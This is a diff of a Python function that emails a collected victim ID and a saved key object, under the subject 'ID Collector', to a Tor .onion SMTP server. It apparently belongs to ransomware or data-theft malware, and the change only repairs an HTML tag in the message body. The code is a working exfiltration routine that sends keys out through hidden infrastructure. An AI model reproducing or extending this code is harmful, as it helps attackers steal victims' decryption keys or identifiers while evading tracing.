@@ -20,7 +20,7 @@ def sendMail(to, savedKey):
 	msg['From'] = str(_from)
 	msg['To'] = str(_to)
 	msg['Subject'] = "ID Collector: " + str(_id)
-	message = "<html><body><p>" + str(_id) + "</p><>A new ID has been collected, please verify data!</p><br/><p>" + str(_inheritedKeyObj) + "</p></body></html"
+	message = "<html><body><p>" + str(_id) + "</p><p>A new ID has been collected, please verify data!</p><br/><p>" + str(_inheritedKeyObj) + "</p></body></html"
 	msg.attach(MIMEText(message))
 
 	mailserver = smtplib.SMTP('mail2torx3jqgcpm.onion',25)
